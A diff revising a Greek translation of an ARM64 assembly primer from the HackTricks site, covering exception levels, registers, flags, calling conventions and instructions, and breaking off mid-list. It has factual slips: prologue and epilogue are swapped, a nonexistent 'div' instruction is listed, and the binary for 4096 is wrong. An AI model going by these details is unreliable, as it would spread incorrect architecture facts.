@@ -3,146 +3,146 @@
 {{#include ../../../banners/hacktricks-training.md}}
 
 
-## **Exception Levels - EL (ARM64v8)**
+## **Επίπεδα Εξαιρέσεων - EL (ARM64v8)**
 
-Στην αρχιτεκτονική ARMv8, τα επίπεδα εκτέλεσης, γνωστά ως Exception Levels (ELs), καθορίζουν το επίπεδο προνομίων και τις δυνατότητες του περιβάλλοντος εκτέλεσης. Υπάρχουν τέσσερα exception levels, από EL0 έως EL3, καθένα από τα οποία εξυπηρετεί διαφορετικό σκοπό:
+Στην αρχιτεκτονική ARMv8, τα επίπεδα εκτέλεσης, γνωστά ως Exception Levels (ELs), καθορίζουν το επίπεδο προνομίων και τις δυνατότητες του περιβάλλοντος εκτέλεσης. Υπάρχουν τέσσερα επίπεδα εξαιρέσεων, από το EL0 έως το EL3, καθένα με διαφορετικό σκοπό:
 
 1. **EL0 - User Mode**:
-- Αυτό είναι το λιγότερο προνομιούχο επίπεδο και χρησιμοποιείται για την εκτέλεση κανονικού κώδικα εφαρμογών.
+- Είναι το επίπεδο με τα λιγότερα προνόμια και χρησιμοποιείται για την εκτέλεση κανονικού application code.
 - Οι εφαρμογές που εκτελούνται στο EL0 είναι απομονωμένες μεταξύ τους και από το system software, ενισχύοντας την ασφάλεια και τη σταθερότητα.
 2. **EL1 - Operating System Kernel Mode**:
-- Οι περισσότεροι πυρήνες operating systems εκτελούνται σε αυτό το επίπεδο.
-- Το EL1 έχει περισσότερα προνόμια από το EL0 και μπορεί να έχει πρόσβαση σε system resources, αλλά με ορισμένους περιορισμούς για τη διασφάλιση της ακεραιότητας του συστήματος. Από το EL0 στο EL1 μεταβαίνετε με την εντολή SVC.
+- Οι περισσότεροι πυρήνες λειτουργικών συστημάτων εκτελούνται σε αυτό το επίπεδο.
+- Το EL1 έχει περισσότερα προνόμια από το EL0 και μπορεί να έχει πρόσβαση σε system resources, αλλά με ορισμένους περιορισμούς για τη διασφάλιση της ακεραιότητας του συστήματος. Η μετάβαση από το EL0 στο EL1 γίνεται με την εντολή SVC.
 3. **EL2 - Hypervisor Mode**:
-- Αυτό το επίπεδο χρησιμοποιείται για virtualization. Ένας hypervisor που εκτελείται στο EL2 μπορεί να διαχειρίζεται πολλά operating systems (καθένα στο δικό του EL1) που εκτελούνται στο ίδιο physical hardware.
-- Το EL2 παρέχει δυνατότητες για isolation και control των virtualized environments.
-- Έτσι, εφαρμογές virtual machines όπως το Parallels μπορούν να χρησιμοποιούν το `hypervisor.framework` για να αλληλεπιδρούν με το EL2 και να εκτελούν virtual machines χωρίς να χρειάζονται kernel extensions.
+- Αυτό το επίπεδο χρησιμοποιείται για virtualization. Ένας hypervisor που εκτελείται στο EL2 μπορεί να διαχειρίζεται πολλά λειτουργικά συστήματα (το καθένα στο δικό του EL1), τα οποία εκτελούνται στο ίδιο physical hardware.
+- Το EL2 παρέχει δυνατότητες απομόνωσης και ελέγχου των virtualized environments.
+- Επομένως, εφαρμογές virtual machines όπως το Parallels μπορούν να χρησιμοποιούν το `hypervisor.framework` για να αλληλεπιδρούν με το EL2 και να εκτελούν virtual machines χωρίς να χρειάζονται kernel extensions.
 - Για τη μετάβαση από το EL1 στο EL2 χρησιμοποιείται η εντολή `HVC`.
 4. **EL3 - Secure Monitor Mode**:
-- Αυτό είναι το πιο προνομιούχο επίπεδο και χρησιμοποιείται συχνά για secure booting και trusted execution environments.
+- Είναι το επίπεδο με τα περισσότερα προνόμια και χρησιμοποιείται συχνά για secure booting και trusted execution environments.
 - Το EL3 μπορεί να διαχειρίζεται και να ελέγχει τις προσβάσεις μεταξύ secure και non-secure states (όπως secure boot, trusted OS κ.λπ.).
 - Χρησιμοποιούνταν για το KPP (Kernel Patch Protection) στο macOS, αλλά πλέον δεν χρησιμοποιείται.
 - Το EL3 δεν χρησιμοποιείται πλέον από την Apple.
 - Η μετάβαση στο EL3 γίνεται συνήθως με την εντολή `SMC` (Secure Monitor Call).
 
-Η χρήση αυτών των επιπέδων παρέχει έναν δομημένο και ασφαλή τρόπο διαχείρισης διαφορετικών πτυχών του συστήματος, από τις user applications έως το πιο προνομιούχο system software. Η προσέγγιση του ARMv8 στα privilege levels βοηθά στην αποτελεσματική απομόνωση των διαφορετικών system components, ενισχύοντας έτσι την ασφάλεια και την ανθεκτικότητα του συστήματος.
+Η χρήση αυτών των επιπέδων επιτρέπει έναν δομημένο και ασφαλή τρόπο διαχείρισης διαφορετικών πτυχών του συστήματος, από τις user applications έως το system software με τα περισσότερα προνόμια. Η προσέγγιση του ARMv8 στα privilege levels βοηθά στην αποτελεσματική απομόνωση των διαφορετικών system components, ενισχύοντας έτσι την ασφάλεια και την ανθεκτικότητα του συστήματος.
 
 ## **Registers (ARM64v8)**
 
-Το ARM64 διαθέτει **31 general-purpose registers**, με ονομασίες από `x0` έως `x30`. Καθένας μπορεί να αποθηκεύσει μια τιμή **64-bit** (8-byte). Για operations που απαιτούν μόνο τιμές 32-bit, τα ίδια registers μπορούν να προσπελαστούν σε 32-bit mode χρησιμοποιώντας τα ονόματα w0 έως w30.
+Το ARM64 διαθέτει **31 general-purpose registers**, με ονομασίες από `x0` έως `x30`. Κάθε ένα μπορεί να αποθηκεύσει μια τιμή **64-bit** (8-byte). Για λειτουργίες που απαιτούν μόνο τιμές 32-bit, τα ίδια registers μπορούν να προσπελαστούν σε 32-bit mode με τα ονόματα w0 έως w30.
 
-1. **`x0`** έως **`x7`** - Αυτά χρησιμοποιούνται συνήθως ως scratch registers και για τη μεταβίβαση παραμέτρων σε subroutines.
+1. **`x0`** έως **`x7`** - Χρησιμοποιούνται συνήθως ως scratch registers και για τη μεταβίβαση παραμέτρων σε subroutines.
 - Το **`x0`** περιέχει επίσης τα return data μιας function
-2. **`x8`** - Στον Linux kernel, το `x8` χρησιμοποιείται ως system call number για την εντολή `svc`. **Στο macOS χρησιμοποιείται το x16!**
-3. **`x9`** έως **`x15`** - Περισσότερα temporary registers, που χρησιμοποιούνται συχνά για local variables.
+2. **`x8`** - Στο Linux kernel, το `x8` χρησιμοποιείται ως system call number για την εντολή `svc`. **Στο macOS χρησιμοποιείται το x16!**
+3. **`x9`** έως **`x15`** - Επιπλέον temporary registers, που χρησιμοποιούνται συχνά για local variables.
 4. **`x16`** και **`x17`** - **Intra-procedural Call Registers**. Temporary registers για immediate values. Χρησιμοποιούνται επίσης για indirect function calls και PLT (Procedure Linkage Table) stubs.
 - Το **`x16`** χρησιμοποιείται ως το **system call number** για την εντολή **`svc`** στο **macOS**.
-5. **`x18`** - **Platform register**. Μπορεί να χρησιμοποιηθεί ως general-purpose register, αλλά σε ορισμένες πλατφόρμες είναι δεσμευμένο για platform-specific χρήσεις: δείκτης στο current thread environment block στα Windows ή δείκτης στο **executing task structure στον linux kernel**.
-6. **`x19`** έως **`x28`** - Αυτά είναι callee-saved registers. Μια function πρέπει να διατηρεί τις τιμές αυτών των registers για τον caller της, επομένως αποθηκεύονται στο stack και ανακτώνται πριν από την επιστροφή στον caller.
-7. **`x29`** - **Frame pointer** για την παρακολούθηση του stack frame. Όταν δημιουργείται νέο stack frame επειδή καλείται μια function, το register **`x29`** **αποθηκεύεται στο stack** και η διεύθυνση του **νέου** frame pointer (η διεύθυνση του **`sp`**) **αποθηκεύεται σε αυτό το register**.
+5. **`x18`** - **Platform register**. Μπορεί να χρησιμοποιηθεί ως general-purpose register, αλλά σε ορισμένες πλατφόρμες είναι δεσμευμένο για platform-specific χρήσεις: δείκτης στο current thread environment block στα Windows ή δείκτης στο **executing task structure στο linux kernel**.
+6. **`x19`** έως **`x28`** - Είναι callee-saved registers. Μια function πρέπει να διατηρεί τις τιμές αυτών των registers για τον caller της, επομένως αποθηκεύονται στο stack και ανακτώνται πριν από την επιστροφή στον caller.
+7. **`x29`** - **Frame pointer**, για την παρακολούθηση του stack frame. Όταν δημιουργείται ένα νέο stack frame επειδή καλείται μια function, το register **`x29`** **αποθηκεύεται στο stack** και η διεύθυνση του **νέου** frame pointer (η διεύθυνση του **`sp`**) **αποθηκεύεται σε αυτό το register**.
 - Αυτό το register μπορεί επίσης να χρησιμοποιηθεί ως **general-purpose register**, αν και συνήθως χρησιμοποιείται ως αναφορά σε **local variables**.
-8. **`x30`** ή **`lr`**- **Link register**. Περιέχει τη **return address** όταν εκτελείται μια εντολή `BL` (Branch with Link) ή `BLR` (Branch with Link to Register), αποθηκεύοντας την τιμή του **`pc`** σε αυτό το register.
+8. **`x30`** ή **`lr`** - **Link register**. Περιέχει τη **return address** όταν εκτελείται μια εντολή `BL` (Branch with Link) ή `BLR` (Branch with Link to Register), αποθηκεύοντας την τιμή του **`pc`** σε αυτό το register.
 - Μπορεί επίσης να χρησιμοποιηθεί όπως οποιοδήποτε άλλο register.
-- Αν η τρέχουσα function πρόκειται να καλέσει μια νέα function και συνεπώς να κάνει overwrite το `lr`, θα το αποθηκεύσει στο stack στην αρχή. Αυτό είναι το epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Αποθήκευση των `fp` και `lr`, δημιουργία χώρου και λήψη νέου `fp`) και θα το ανακτήσει στο τέλος. Αυτό είναι το prologue (`ldp x29, x30, [sp], #48; ret` -> Ανάκτηση των `fp` και `lr` και επιστροφή).
+- Αν η τρέχουσα function πρόκειται να καλέσει μια νέα function και επομένως να αντικαταστήσει το `lr`, το αποθηκεύει αρχικά στο stack. Αυτό είναι το epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Αποθήκευση των `fp` και `lr`, δημιουργία χώρου και λήψη νέου `fp`) και το ανακτά στο τέλος. Αυτό είναι το prologue (`ldp x29, x30, [sp], #48; ret` -> Ανάκτηση των `fp` και `lr` και επιστροφή).
 9. **`sp`** - **Stack pointer**, χρησιμοποιείται για την παρακολούθηση της κορυφής του stack.
 - Η τιμή του **`sp`** πρέπει πάντα να διατηρείται τουλάχιστον σε **quadword** **alignment**, διαφορετικά μπορεί να προκύψει alignment exception.
-10. **`pc`** - **Program counter**, ο οποίος δείχνει στην επόμενη instruction. Αυτό το register μπορεί να ενημερωθεί μόνο μέσω exception generations, exception returns και branches. Οι μόνες ordinary instructions που μπορούν να διαβάσουν αυτό το register είναι οι branch with link instructions (BL, BLR), για να αποθηκεύσουν τη διεύθυνση του **`pc`** στο **`lr`** (Link Register).
-11. **`xzr`** - **Zero register**. Ονομάζεται επίσης **`wzr`** στη **32**-bit μορφή register. Μπορεί να χρησιμοποιηθεί για εύκολη λήψη της τιμής zero (συνηθισμένο operation) ή για την εκτέλεση συγκρίσεων με χρήση του **`subs`**, όπως **`subs XZR, Xn, #10`**, αποθηκεύοντας τα resulting data πουθενά (στο **`xzr`**).
+10. **`pc`** - **Program counter**, ο οποίος δείχνει στην επόμενη εντολή. Αυτό το register μπορεί να ενημερωθεί μόνο μέσω exception generations, exception returns και branches. Οι μόνες ordinary instructions που μπορούν να διαβάσουν αυτό το register είναι οι branch with link instructions (BL, BLR), ώστε να αποθηκεύσουν τη διεύθυνση του **`pc`** στο **`lr`** (Link Register).
+11. **`xzr`** - **Zero register**. Ονομάζεται επίσης **`wzr`** στη **32**-bit μορφή register. Μπορεί να χρησιμοποιηθεί για εύκολη λήψη της τιμής zero (συνηθισμένη λειτουργία) ή για συγκρίσεις με χρήση του **`subs`**, όπως η **`subs XZR, Xn, #10`**, απορρίπτοντας τα resulting data (στο **`xzr`**).
 
 Τα **`Wn`** registers είναι η **32-bit** έκδοση του **`Xn`** register.
 
 > [!TIP]
-> Τα registers από X0 έως X18 είναι volatile, πράγμα που σημαίνει ότι οι τιμές τους μπορούν να αλλάξουν από function calls και interrupts. Ωστόσο, τα registers από X19 έως X28 είναι non-volatile, δηλαδή οι τιμές τους πρέπει να διατηρούνται μεταξύ function calls ("callee saved").
+> Τα registers από X0 έως X18 είναι volatile, δηλαδή οι τιμές τους μπορούν να αλλάξουν από function calls και interrupts. Ωστόσο, τα registers από X19 έως X28 είναι non-volatile, δηλαδή οι τιμές τους πρέπει να διατηρούνται μεταξύ function calls ("callee saved").
 
-### SIMD and Floating-Point Registers
+### SIMD και Floating-Point Registers
 
-Επιπλέον, υπάρχουν άλλα **32 registers μήκους 128-bit** που μπορούν να χρησιμοποιηθούν σε optimized single instruction multiple data (SIMD) operations και για floating-point arithmetic. Αυτά ονομάζονται Vn registers, αν και μπορούν επίσης να λειτουργούν σε **64**-bit, **32**-bit, **16**-bit και **8**-bit mode, οπότε ονομάζονται **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** και **`Bn`**.
+Επιπλέον, υπάρχουν άλλα **32 registers μήκους 128-bit**, τα οποία μπορούν να χρησιμοποιηθούν σε optimized single instruction multiple data (SIMD) operations και για floating-point arithmetic. Ονομάζονται Vn registers, αν και μπορούν επίσης να λειτουργούν σε **64**-bit, **32**-bit, **16**-bit και **8**-bit, οπότε ονομάζονται αντίστοιχα **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** και **`Bn`**.
 
 ### System Registers
 
 **Υπάρχουν εκατοντάδες system registers**, γνωστά επίσης ως special-purpose registers (SPRs), τα οποία χρησιμοποιούνται για την **παρακολούθηση** και τον **έλεγχο** της συμπεριφοράς των **processors**.\
-Μπορούν να διαβαστούν ή να οριστούν μόνο με χρήση των ειδικών instructions **`mrs`** και **`msr`**.
+Μπορούν να διαβαστούν ή να οριστούν μόνο με τις ειδικές dedicated instructions **`mrs`** και **`msr`**.
 
-Τα special registers **`TPIDR_EL0`** και **`TPIDDR_EL0`** εμφανίζονται συχνά κατά το reverse engineering. Το suffix `EL0` υποδεικνύει το **ελάχιστο exception level** από το οποίο είναι δυνατή η πρόσβαση στο register (σε αυτή την περίπτωση, το EL0 είναι το κανονικό exception (privilege) level με το οποίο εκτελούνται τα regular programs).\
-Χρησιμοποιούνται συχνά για την αποθήκευση της **base address της thread-local storage** memory region. Συνήθως το πρώτο είναι readable και writable για programs που εκτελούνται στο EL0, ενώ το δεύτερο μπορεί να διαβαστεί από το EL0 και να γραφτεί από το EL1 (όπως ο kernel).
+Τα special registers **`TPIDR_EL0`** και **`TPIDDR_EL0`** συναντώνται συχνά κατά το reverse engineering. Το suffix `EL0` υποδεικνύει το **ελάχιστο exception level** από το οποίο είναι δυνατή η πρόσβαση στο register (σε αυτή την περίπτωση το EL0 είναι το κανονικό exception (privilege) level με το οποίο εκτελούνται τα regular programs).\
+Συχνά χρησιμοποιούνται για την αποθήκευση της **base address της thread-local storage** memory region. Συνήθως το πρώτο είναι readable και writable για programs που εκτελούνται στο EL0, ενώ το δεύτερο μπορεί να διαβαστεί από το EL0 και να γραφτεί από το EL1 (όπως ο kernel).
 
 - `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
 - `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`
 
 ### **PSTATE**
 
-Το **PSTATE** περιέχει πολλά process components serialized στο **`SPSR_ELx`** special register που είναι ορατό στο operating system, όπου X είναι το **permission** **level του triggered** exception (αυτό επιτρέπει την ανάκτηση του process state όταν ολοκληρωθεί το exception).\
-Αυτά είναι τα προσβάσιμα fields:
+Το **PSTATE** περιέχει πολλά process components serialized στο operating-system-visible **`SPSR_ELx`** special register, όπου το X είναι το **permission** **level του triggered** exception (αυτό επιτρέπει την ανάκτηση του process state όταν ολοκληρωθεί το exception).\
+Τα προσβάσιμα fields είναι τα εξής:
 
 <figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>
 
-- Τα condition flags **`N`**, **`Z`**, **`C`** και **`V`**:
-- Το **`N`** σημαίνει ότι το operation παρήγαγε αρνητικό αποτέλεσμα
-- Το **`Z`** σημαίνει ότι το operation παρήγαγε μηδενικό αποτέλεσμα
-- Το **`C`** σημαίνει ότι το operation παρήγαγε carry
-- Το **`V`** σημαίνει ότι το operation παρήγαγε signed overflow:
-- Το άθροισμα δύο θετικών αριθμών παράγει αρνητικό αποτέλεσμα.
-- Το άθροισμα δύο αρνητικών αριθμών παράγει θετικό αποτέλεσμα.
-- Στην αφαίρεση, όταν ένας μεγάλος αρνητικός αριθμός αφαιρείται από έναν μικρότερο θετικό αριθμό (ή το αντίστροφο) και το αποτέλεσμα δεν μπορεί να αναπαρασταθεί εντός του εύρους του δεδομένου bit size.
-- Προφανώς ο processor δεν γνωρίζει αν το operation είναι signed ή όχι, επομένως ελέγχει τα C και V στα operations και υποδεικνύει αν προέκυψε carry σε περίπτωση που ήταν signed ή unsigned.
+- Τα **`N`**, **`Z`**, **`C`** και **`V`** condition flags:
+- **`N`** σημαίνει ότι η operation παρήγαγε negative result
+- **`Z`** σημαίνει ότι η operation παρήγαγε zero
+- **`C`** σημαίνει ότι η operation παρήγαγε carry
+- **`V`** σημαίνει ότι η operation παρήγαγε signed overflow:
+- Το άθροισμα δύο θετικών αριθμών παράγει negative result.
+- Το άθροισμα δύο αρνητικών αριθμών παράγει positive result.
+- Στην αφαίρεση, όταν ένας μεγάλος αρνητικός αριθμός αφαιρείται από έναν μικρότερο θετικό αριθμό (ή αντίστροφα) και το αποτέλεσμα δεν μπορεί να αναπαρασταθεί εντός του range του δεδομένου bit size.
+- Προφανώς ο processor δεν γνωρίζει αν η operation είναι signed ή unsigned, επομένως ελέγχει τα C και V στις operations και υποδεικνύει αν προέκυψε carry στην signed ή unsigned περίπτωση.
 
 > [!WARNING]
-> Δεν ενημερώνουν όλα τα instructions αυτά τα flags. Ορισμένα, όπως τα **`CMP`** ή **`TST`**, το κάνουν, όπως και άλλα που έχουν suffix s, όπως το **`ADDS`**.
+> Δεν ενημερώνουν όλες οι instructions αυτά τα flags. Ορισμένες, όπως οι **`CMP`** ή **`TST`**, το κάνουν, όπως και άλλες που έχουν suffix s, όπως η **`ADDS`**.
 
-- Το τρέχον **register width (`nRW`) flag**: Αν το flag έχει την τιμή 0, το πρόγραμμα θα εκτελεστεί στο AArch64 execution state μετά την επαναφορά του.
-- Το τρέχον **Exception Level** (**`EL`**): Ένα regular program που εκτελείται στο EL0 θα έχει την τιμή 0
-- Το **single stepping** flag (**`SS`**): Χρησιμοποιείται από debuggers για single step, θέτοντας το SS flag σε 1 μέσα στο **`SPSR_ELx`** μέσω ενός exception. Το πρόγραμμα θα εκτελέσει ένα step και θα προκαλέσει single step exception.
-- Το **illegal exception** state flag (**`IL`**): Χρησιμοποιείται για να επισημαίνει ότι privileged software εκτέλεσε μη έγκυρη exception level transfer. Αυτό το flag τίθεται σε 1 και ο processor προκαλεί illegal state exception.
-- Τα **`DAIF`** flags: Αυτά τα flags επιτρέπουν σε ένα privileged program να κάνει selectively mask ορισμένα external exceptions.
-- Αν το **`A`** είναι 1, σημαίνει ότι θα προκαλούνται **asynchronous aborts**. Το **`I`** ρυθμίζει την απόκριση σε external hardware **Interrupts Requests** (IRQs), ενώ το F σχετίζεται με **Fast Interrupt Requests** (FIRs).
-- Τα **stack pointer select** flags (**`SPS`**): Privileged programs που εκτελούνται στο EL1 και άνω μπορούν να εναλλάσσονται μεταξύ του δικού τους stack pointer register και εκείνου του user model (π.χ. μεταξύ `SP_EL1` και `EL0`). Η εναλλαγή αυτή εκτελείται με εγγραφή στο **`SPSel`** special register. Αυτό δεν μπορεί να γίνει από το EL0.
+- Το τρέχον **register width (`nRW`) flag**: Αν το flag έχει τιμή 0, το πρόγραμμα θα εκτελεστεί στο AArch64 execution state μετά την επαναφορά του.
+- Το τρέχον **Exception Level** (**`EL`**): Ένα regular program που εκτελείται στο EL0 έχει την τιμή 0.
+- Το **single stepping** flag (**`SS`**): Χρησιμοποιείται από debuggers για single stepping, με ορισμό του SS flag σε 1 μέσα στο **`SPSR_ELx`** μέσω ενός exception. Το πρόγραμμα θα εκτελέσει ένα step και θα προκαλέσει single step exception.
+- Το **illegal exception** state flag (**`IL`**): Χρησιμοποιείται για να σηματοδοτεί ότι privileged software εκτέλεσε invalid exception level transfer. Το flag ορίζεται σε 1 και ο processor προκαλεί illegal state exception.
+- Τα **`DAIF`** flags: Αυτά τα flags επιτρέπουν σε ένα privileged program να κάνει επιλεκτικά mask ορισμένων external exceptions.
+- Αν το **`A`** είναι 1, σημαίνει ότι θα προκληθούν **asynchronous aborts**. Το **`I`** ρυθμίζει την απόκριση σε external hardware **Interrupts Requests** (IRQs) και το F σχετίζεται με **Fast Interrupt Requests** (FIRs).
+- Τα **stack pointer select** flags (**`SPS`**): Privileged programs που εκτελούνται στο EL1 και πάνω μπορούν να εναλλάσσονται μεταξύ του δικού τους stack pointer register και αυτού του user model (π.χ. μεταξύ `SP_EL1` και `EL0`). Η εναλλαγή αυτή πραγματοποιείται με εγγραφή στο **`SPSel`** special register. Αυτό δεν μπορεί να γίνει από το EL0.
 
 ## **Calling Convention (ARM64v8)**
 
-Το ARM64 calling convention καθορίζει ότι οι **πρώτες οκτώ παράμετροι** μιας function περνούν στα registers **`x0`** έως **`x7`**. Οι **επιπλέον** παράμετροι περνούν στο **stack**. Η **return** τιμή περνά πίσω στο register **`x0`** ή και στο **`x1`** **αν έχει μήκος 128 bits**. Τα registers **`x19`** έως **`x30`** και **`sp`** πρέπει να **διατηρούνται** μεταξύ function calls.
+Η ARM64 calling convention ορίζει ότι οι **πρώτες οκτώ παράμετροι** μιας function περνούν στα registers **`x0`** έως **`x7`**. Οι **επιπλέον** παράμετροι περνούν στο **stack**. Η **return** value επιστρέφεται στο register **`x0`** ή και στο **`x1`** **αν έχει μήκος 128 bits**. Τα registers **`x19`** έως **`x30`** και το **`sp`** πρέπει να **διατηρούνται** μεταξύ function calls.
 
-Κατά την ανάγνωση μιας function σε assembly, αναζητήστε το **function prologue και epilogue**. Το **prologue** συνήθως περιλαμβάνει την **αποθήκευση του frame pointer (`x29`)**, τη ρύθμιση ενός **νέου frame pointer** και τη **δέσμευση χώρου στο stack**. Το **epilogue** συνήθως περιλαμβάνει την **επαναφορά του αποθηκευμένου frame pointer** και την **επιστροφή** από τη function.
+Κατά την ανάγνωση μιας function σε assembly, αναζητήστε το **function prologue και epilogue**. Το **prologue** συνήθως περιλαμβάνει την **αποθήκευση του frame pointer (`x29`)**, τη ρύθμιση ενός **νέου frame pointer** και την **κατανομή χώρου στο stack**. Το **epilogue** συνήθως περιλαμβάνει την **επαναφορά του αποθηκευμένου frame pointer** και την **επιστροφή** από τη function.
 
 ### Calling Convention in Swift
 
-Το Swift έχει το δικό του **calling convention**, το οποίο μπορείτε να βρείτε στο [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)
+Η Swift έχει τη δική της **calling convention**, η οποία βρίσκεται στο [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)
 
 ## **Common Instructions (ARM64v8)**
 
-Οι ARM64 instructions έχουν γενικά τη **μορφή `opcode dst, src1, src2`**, όπου το **`opcode`** είναι το **operation** που θα εκτελεστεί (όπως `add`, `sub`, `mov` κ.λπ.), το **`dst`** είναι το **destination** register όπου θα αποθηκευτεί το αποτέλεσμα και τα **`src1`** και **`src2`** είναι τα **source** registers. Immediate values μπορούν επίσης να χρησιμοποιηθούν στη θέση των source registers.
+Οι ARM64 instructions έχουν γενικά τη **μορφή `opcode dst, src1, src2`**, όπου το **`opcode`** είναι η operation που θα εκτελεστεί (όπως `add`, `sub`, `mov` κ.λπ.), το **`dst`** είναι το **destination** register όπου θα αποθηκευτεί το αποτέλεσμα και τα **`src1`** και **`src2`** είναι τα **source** registers. Immediate values μπορούν επίσης να χρησιμοποιηθούν στη θέση των source registers.
 
-- **`mov`**: **Μετακινεί** μια τιμή από ένα **register** σε άλλο.
+- **`mov`**: **Μετακινεί** μια τιμή από ένα **register** σε ένα άλλο.
 - Example: `mov x0, x1` — Μετακινεί την τιμή από το `x1` στο `x0`.
 - **`ldr`**: **Φορτώνει** μια τιμή από τη **memory** σε ένα **register**.
-- Example: `ldr x0, [x1]` — Φορτώνει στο `x0` την τιμή από τη memory location στην οποία δείχνει το `x1`.
+- Example: `ldr x0, [x1]` — Φορτώνει στο `x0` την τιμή από τη memory location που υποδεικνύεται από το `x1`.
 - **Offset mode**: Ένα offset που επηρεάζει τον origin pointer υποδεικνύεται, για παράδειγμα:
-- `ldr x2, [x1, #8]`, αυτό φορτώνει στο x2 την τιμή από το x1 + 8
-- `ldr x2, [x0, x1, lsl #2]`, αυτό φορτώνει στο x2 ένα object από το array x0, από τη θέση x1 (index) \* 4
+- `ldr x2, [x1, #8]`, φορτώνει στο x2 την τιμή από το x1 + 8
+- `ldr x2, [x0, x1, lsl #2]`, φορτώνει στο x2 ένα object από το array x0, στη θέση x1 (index) \* 4
 - **Pre-indexed mode**: Εφαρμόζει calculations στον origin, λαμβάνει το αποτέλεσμα και αποθηκεύει επίσης τον νέο origin στον origin.
 - `ldr x2, [x1, #8]!`, φορτώνει το `x1 + 8` στο `x2` και αποθηκεύει στο x1 το αποτέλεσμα του `x1 + 8`
-- `str lr, [sp, #-4]!`, αποθηκεύει το link register στο sp και ενημερώνει το register sp
-- **Post-index mode**: Είναι παρόμοιο με το προηγούμενο, αλλά η memory address προσπελαύνεται πρώτα και έπειτα υπολογίζεται και αποθηκεύεται το offset.
+- `str lr, [sp, #-4]!`, Αποθηκεύει το link register στο sp και ενημερώνει το register sp
+- **Post-index mode**: Είναι παρόμοιο με το προηγούμενο, αλλά πρώτα γίνεται access στη memory address και μετά υπολογίζεται και αποθηκεύεται το offset.
 - `ldr x0, [x1], #8`, φορτώνει το `x1` στο `x0` και ενημερώνει το x1 με `x1 + 8`
-- **PC-relative addressing**: Σε αυτή την περίπτωση, η address προς φόρτωση υπολογίζεται σχετικά με το PC register
-- `ldr x1, =_start`, φορτώνει στο x1 τη διεύθυνση όπου ξεκινά το `_start` symbol, σε σχέση με το τρέχον PC.
+- **PC-relative addressing**: Σε αυτή την περίπτωση, η address που θα φορτωθεί υπολογίζεται relative προς το PC register.
+- `ldr x1, =_start`, Φορτώνει στο x1 τη διεύθυνση όπου ξεκινά το `_start` symbol, σε σχέση με το τρέχον PC.
 - **`str`**: **Αποθηκεύει** μια τιμή από ένα **register** στη **memory**.
-- Example: `str x0, [x1]` — Αποθηκεύει την τιμή του `x0` στη memory location στην οποία δείχνει το `x1`.
+- Example: `str x0, [x1]` — Αποθηκεύει την τιμή του `x0` στη memory location που υποδεικνύεται από το `x1`.
 - **`ldp`**: **Load Pair of Registers**. Αυτή η instruction **φορτώνει δύο registers** από **διαδοχικές memory** locations. Η memory address σχηματίζεται συνήθως προσθέτοντας ένα offset στην τιμή ενός άλλου register.
-- Example: `ldp x0, x1, [x2]` — Φορτώνει τα `x0` και `x1` από τις memory locations στα `x2` και `x2 + 8`, αντίστοιχα.
+- Example: `ldp x0, x1, [x2]` — Φορτώνει τα `x0` και `x1` από τις memory locations `x2` και `x2 + 8`, αντίστοιχα.
 - **`stp`**: **Store Pair of Registers**. Αυτή η instruction **αποθηκεύει δύο registers** σε **διαδοχικές memory** locations. Η memory address σχηματίζεται συνήθως προσθέτοντας ένα offset στην τιμή ενός άλλου register.
-- Example: `stp x0, x1, [sp]` — Αποθηκεύει τα `x0` και `x1` στις memory locations στα `sp` και `sp + 8`, αντίστοιχα.
-- `stp x0, x1, [sp, #16]!` — Αποθηκεύει τα `x0` και `x1` στις memory locations στα `sp+16` και `sp + 24`, αντίστοιχα, και ενημερώνει το `sp` με `sp+16`.
+- Example: `stp x0, x1, [sp]` — Αποθηκεύει τα `x0` και `x1` στις memory locations `sp` και `sp + 8`, αντίστοιχα.
+- `stp x0, x1, [sp, #16]!` — Αποθηκεύει τα `x0` και `x1` στις memory locations `sp+16` και `sp + 24`, αντίστοιχα, και ενημερώνει το `sp` με `sp+16`.
 - **`add`**: **Προσθέτει** τις τιμές δύο registers και αποθηκεύει το αποτέλεσμα σε ένα register.
 - Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
 - Xn1 -> Destination
 - Xn2 -> Operand 1
-- Xn3 | #imm -> Operand 2 (register ή immediate)
+- Xn3 | #imm -> Operando 2 (register ή immediate)
 - \[shift #N | RRX] -> Εκτελεί shift ή καλεί RRX
 - Example: `add x0, x1, x2` — Προσθέτει τις τιμές των `x1` και `x2` και αποθηκεύει το αποτέλεσμα στο `x0`.
-- `add x5, x5, #1, lsl #12` — Αυτό ισούται με 4096 (ένα 1 shifted 12 φορές) -> 1 0000 0000 0000 0000
+- `add x5, x5, #1, lsl #12` — Ισούται με 4096 (ένα 1 που μετακινείται 12 φορές) -> 1 0000 0000 0000 0000
 - **`adds`** Εκτελεί ένα `add` και ενημερώνει τα flags
 - **`sub`**: **Αφαιρεί** τις τιμές δύο registers και αποθηκεύει το αποτέλεσμα σε ένα register.
-- Ελέγξτε το **`add`** **syntax**.
+- Ελέγξτε το **syntax του `add`**.
 - Example: `sub x0, x1, x2` — Αφαιρεί την τιμή του `x2` από το `x1` και αποθηκεύει το αποτέλεσμα στο `x0`.
 - **`subs`** Είναι όπως το sub, αλλά ενημερώνει το flag
 - **`mul`**: **Πολλαπλασιάζει** τις τιμές **δύο registers** και αποθηκεύει το αποτέλεσμα σε ένα register.
@@ -150,64 +150,64 @@
 - **`div`**: **Διαιρεί** την τιμή ενός register με ένα άλλο και αποθηκεύει το αποτέλεσμα σε ένα register.
 - Example: `div x0, x1, x2` — Διαιρεί την τιμή του `x1` με το `x2` και αποθηκεύει το αποτέλεσμα στο `x0`.
 - **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
-- **Logical shift left**: Προσθέτει 0s από το τέλος, μετακινώντας τα υπόλοιπα bits προς τα εμπρός (πολλαπλασιασμός επί n φορές το 2)
